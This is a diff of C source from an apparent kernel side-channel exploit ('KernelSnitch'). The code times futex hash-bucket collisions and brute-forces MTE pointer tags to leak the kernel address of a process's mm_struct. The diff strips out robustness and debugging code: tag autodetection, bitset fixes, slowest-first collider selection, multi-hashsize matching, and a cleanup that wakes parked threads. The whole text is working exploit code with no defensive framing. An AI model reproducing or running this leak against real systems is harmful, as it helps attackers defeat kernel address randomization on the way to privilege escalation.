@@ -28,30 +28,6 @@
 #endif
 #define APPENDED_FUTEXES 4096
 #define MULITPLE 4
-#define KS_BUCKET_ID 128
-
-/* KASAN_HW_TAGS (MTE) puts a random tag in pointer bits 56-59; current->mm
- * stored in the futex key is tagged, so the bruteforce must enumerate tags.
- * Tag 0 is part of the enumeration, enabling this is a strict superset. */
-static int kernelsnitch_mte_auto(void)
-{
-    const char *env = getenv("KSNITCH_MTE");
-    if (env)
-        return atoi(env) > 0;
-    FILE *f = fopen("/proc/cpuinfo", "r");
-    if (!f)
-        return 0;
-    char line[1024];
-    int mte = 0;
-    while (fgets(line, sizeof(line), f)) {
-        if (strncmp(line, "Features", 8) == 0 && strstr(line, "mte")) {
-            mte = 1;
-            break;
-        }
-    }
-    fclose(f);
-    return mte;
-}
 #if defined(__INTEL) || defined(__AMD)
 #define IDENTITY_START 0xffff888000000000ULL
 #define IDENTITY_END   0xffffc88000000000ULL
@@ -119,11 +95,6 @@ struct kernelsnitch_shared_state {
     enum kernelsnitch_state state;
 
     int mte_enabled;
-
-    /* DEBUG: counters to verify waiter threads actually reach futex_wait */
-    volatile size_t waiters_created;
-    volatile size_t waiters_slept;
-    volatile int    wait_futex_ret;
 };
 
 #define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)
@@ -150,14 +121,7 @@ static void *__do_increase(void *arg)
     struct inc_arg *inc_arg = (struct inc_arg *)arg;
     struct kernelsnitch_shared_state *ks = inc_arg->ks;
     size_t id = inc_arg->id;
-    /* Pass FUTEX_BITSET_MATCH_ANY as val3 to bypass the kernel's
-     * !bitset early-return check (returns -EINVAL if zero). */
-    __atomic_add_fetch(&ks->waiters_slept, 1, __ATOMIC_SEQ_CST);
-    int fret = __futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, FUTEX_BITSET_MATCH_ANY);
-    __atomic_store_n(&ks->wait_futex_ret, fret, __ATOMIC_SEQ_CST);
-    if (fret < 0)
-        pr_warning("FUTEX_WAIT returned %d (errno=%d)\n", fret, -fret);
-    /* If we get here, we woke up from futex_wait (rare) */
+    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
     free(inc_arg);
     return 0;
 }
@@ -171,26 +135,13 @@ static void *__do_increase(void *arg)
 static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
 {
     pthread_t tid;
-    size_t created = 0;
     for (size_t i = 0; i < amount; ++i) {
         struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
         inc_arg->id = id;
         inc_arg->ks = ks;
-        int ret = pthread_create(&tid, 0, __do_increase, (void *)inc_arg);
-        if (ret == 0) {
-            /* detach: bionic reaps the thread at exit; cleanup() wakes it */
-            pthread_detach(tid);
-            created++;
-        } else {
-            pr_warning("pthread_create %zu failed: %d (%s)\n", i, ret, strerror(ret));
-            free(inc_arg);
-        }
+        SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));
     }
-    __atomic_store_n(&ks->waiters_created, created, __ATOMIC_SEQ_CST);
-    /* give the waiters time to actually enter futex_wait in the kernel */
-    usleep(500000);
-    pr_info("ksnitch waiters created=%zu entered_futex_wait=%zu last_ret=%d\n",
-            created, ks->waiters_slept, ks->wait_futex_ret);
+    WAIT();
 }
 
 /**
@@ -218,10 +169,7 @@ static size_t __measure(size_t futex_addr)
     for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
         sched_yield();
         t0 = rdtsc_begin();
-        /* Kernel futex_wake returns -EINVAL if bitset == 0.
-         * Pass FUTEX_BITSET_MATCH_ANY to actually reach the hash
-         * bucket and traverse the chain. Use val=1 as well. */
-        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 1, NULL, NULL, FUTEX_BITSET_MATCH_ANY));
+        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
         t1 = rdtsc_end();
         __times[l] = t1 - t0;
     }
@@ -253,55 +201,42 @@ static void *__mm_leak(void *arg)
     struct range *range = &mm_leak_arg->range;
     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
     size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
-    size_t scanned = 0;
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
         for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
-                scanned++;
 
-                /* CONFIG_NR_CPUS=32: the kernel hashsize is
-                 * roundup_pow_of_two(256 * num_possible_cpus()) which may
-                 * exceed 256*online. Match against every plausible size at
-                 * once - a true collision (equal low bits for size N) also
-                 * collides for any divisor of N, so the real size is found
-                 * without re-running jhash2 per size. */
-                static const unsigned long ks_hs_table[] = {2048, 4096, 8192, 16384};
-                size_t tag_lo = 0, tag_hi = 1;
-                if (ks->mte_enabled) {
-                    tag_hi = 15;
+                size_t found_hash = 1;
+                if (!ks->mte_enabled) {
+                    // test the mm_struct candidate
+                    for (size_t i = 1; i < ks->collisions && found_hash; ++i)
+                        found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
+                    if (found_hash) {
+                        ks->mm_struct = mm_struct_candidate;
+                        ks->found = 1;
+                        break;
+                    }
                 } else {
-                    const char *env = getenv("KSNITCH_TAG_SWEEP");
-                    if (env && atoi(env) > 0)
-                        tag_hi = 15;
-                }
-                for (size_t tag = tag_lo; tag < tag_hi && !ks->found; ++tag) {
-                    size_t cand = (mm_struct_candidate & ~(0xfULL << 56)) | (tag << 56);
-                    uint32_t hcache[16];
-                    size_t nhash = ks->collisions;
-                    if (nhash > 16)
-                        nhash = 16;
-                    for (size_t i = 0; i < nhash; ++i)
-                        hcache[i] = futex_hash_full(ks->futex_addrs[i], cand);
-                    for (size_t hsi = 0; hsi < sizeof(ks_hs_table)/sizeof(ks_hs_table[0]) && !ks->found; ++hsi) {
-                        uint32_t mask = (uint32_t)(ks_hs_table[hsi] - 1);
-                        size_t found_hash = 1;
-                        for (size_t i = 1; i < nhash && found_hash; ++i)
-                            found_hash = ((hcache[0] & mask) == (hcache[i] & mask));
+                    // need to set the tag if mte is enabled
+                    for (size_t tag_candidate = 0; tag_candidate < 15 && !ks->found; ++tag_candidate) {
+                        size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
+                        __mm_struct_candidate |= (tag_candidate << 56);
+                        found_hash = 1;
+                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
+                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
                         if (found_hash) {
-                            pr_success("ksnitch mm_struct hit=%016zx tag=%zu hashsize=%lu h0=%08x\n",
-                                       cand, tag, ks_hs_table[hsi], hcache[0] & mask);
-                            ks->mm_struct = cand;
+                            if (ks->verbose)
+                                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
+                            ks->mm_struct = __mm_struct_candidate;
                             ks->found = 1;
+                            break;
                         }
                     }
-                }
+                } 
             }
         }
     }
-    pr_info("ksnitch scan thread %zd done scanned=%zu found=%zd range=[%016zx,%016zx)\n",
-            range->id, scanned, ks->found, range->start, range->end);
     free(mm_leak_arg);
     return 0;
 }
@@ -353,14 +288,6 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
         ks->mte_enabled ? "enabled" : "disabled");
     pin_to_core(0);
     futex_init();
-    ks->waiters_created = 0;
-    ks->waiters_slept = 0;
-    ks->wait_futex_ret = 0;
-    pr_info("ksnitch setup: cpus=%zd threads=%zd collisions=%zd mm_sz=%zx slab_order=%zd slab_sz=%zx hashsize=%lu mte=%zd range=[%016zx,%016zx) per_thread=%zx\n",
-            ks->cpu_cnt, ks->thread_cnt, ks->collisions, ks->mm_struct_sz,
-            ks->mm_slab_order, (size_t)(KS_PAGE_SIZE << ks->mm_slab_order),
-            futex_hashsize, (size_t)ks->mte_enabled,
-            (size_t)IDENTITY_START, (size_t)IDENTITY_END, ks->identity_diff);
 
     ks->state = KERNELSNITCH_INIT;
     return ks;
@@ -372,7 +299,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
  */
 void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 {
-    #define ID KS_BUCKET_ID
+    #define ID 128
 #ifndef KERNELSNITCH_THRESHOLD_MULT
 #define KERNELSNITCH_THRESHOLD_MULT 10
 #endif
@@ -384,18 +311,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
     wanted = ks->collisions - 1;
 
-    size_t threshold_mult = KERNELSNITCH_THRESHOLD_MULT;
-    {
-        const char *e = getenv("KSNITCH_THRESHOLD_MULT");
-        if (e) {
-            long v = atol(e);
-            if (v > 0)
-                threshold_mult = (size_t)v;
-        }
-    }
-
     size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]), __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]));
-    size_t threshold = approx_time * threshold_mult;
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
@@ -405,66 +321,23 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     // find futex user space address which collide with the piled-up hash bucket ID 128
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
-    /* scan the WHOLE futex space, then keep the slowest wanted ones: a real
-     * collision walks the 4096-waiter chain and is orders of magnitude slower
-     * than any noise spike, while a first-hit threshold scan can be satisfied
-     * by early noise and silently skip the real colliders */
-    size_t max_time = 0;
-    size_t over_thresh = 0;
-    for (size_t i = 2; i < ks->total_futexes; ++i) {
+    for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
         id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
         if (id >= FUTEX_SZ)
             break;
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(futex_addr);
-        if (ks->times[i] > max_time)
-            max_time = ks->times[i];
-        if (ks->times[i] > threshold)
-            over_thresh++;
-    }
-    pr_info("ksnitch measure done: approx=%zd threshold=%zd max_time=%zd over_threshold=%zd\n",
-            approx_time, threshold, max_time, over_thresh);
-    /* selection: repeatedly take the slowest remaining measurement */
-    {
-        size_t picked = 0;
-        size_t last_time = (size_t)-1;
-        while (picked < wanted && picked < over_thresh) {
-            size_t best = 0;
-            size_t best_time = 0;
-            for (size_t i = 2; i < ks->total_futexes; ++i) {
-                if (ks->times[i] > best_time && ks->times[i] <= last_time) {
-                    /* skip entries already picked (equal times): use index ordering */
-                    size_t dup = 0;
-                    for (size_t j = 1; j <= picked; ++j) {
-                        if (ks->futex_addrs[j] == (size_t)&ks->futexes[(i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE)]) {
-                            dup = 1;
-                            break;
-                        }
-                    }
-                    if (!dup) {
-                        best = i;
-                        best_time = ks->times[i];
-                    }
-                }
-            }
-            if (best == 0 || best_time <= threshold)
-                break;
-            picked++;
-            ks->futex_addrs[picked] = (size_t)&ks->futexes[(best * KS_PAGE_SIZE) | (best * 8 % KS_PAGE_SIZE)];
-            pr_info("ksnitch collider #%zd addr=%016zx time=%zd (x%zd of baseline)\n",
-                    picked, ks->futex_addrs[picked], ks->times[best],
-                    best_time / (approx_time ? approx_time : 1));
-            last_time = ks->times[best];
+        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+            count++;
+            ks->futex_addrs[count] = futex_addr;
+            if (ks->verbose) pr_info("  %016zx\n", futex_addr);
         }
-        count = picked;
     }
     if (wanted == count) {
-        pr_success("ksnitch collisions ok=%zd/%zd approx_time=%zd threshold=%zd max=%zd\n",
-                   count, wanted, approx_time, threshold, max_time);
+        if (ks->verbose) pr_info("found %zd collisisons\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
     } else {
-        pr_warning("ksnitch collisions only=%zd/%zd approx_time=%zd threshold=%zd max=%zd -> cannot continue\n",
-                   count, wanted, approx_time, threshold, max_time);
+        pr_warning("only found %zd collisions -> cannot continue\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
 }
@@ -509,16 +382,6 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
 size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
 {
     ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
-    /* wake the piled-up waiters so the detached threads exit and their kernel
-     * stacks are released; without this every retry leaks APPENDED_FUTEXES
-     * threads and the device OOMs after a handful of rounds */
-    for (int round = 0; round < 2; ++round) {
-        long woken = __futex((unsigned int *)&ks->inc_futex[KS_BUCKET_ID],
-                             FUTEX_WAKE_PRIVATE, 0x7fffffff, NULL, NULL, FUTEX_BITSET_MATCH_ANY);
-        if (woken <= 0)
-            break;
-        usleep(200000);
-    }
     munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
     ks->times = 0;
     munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
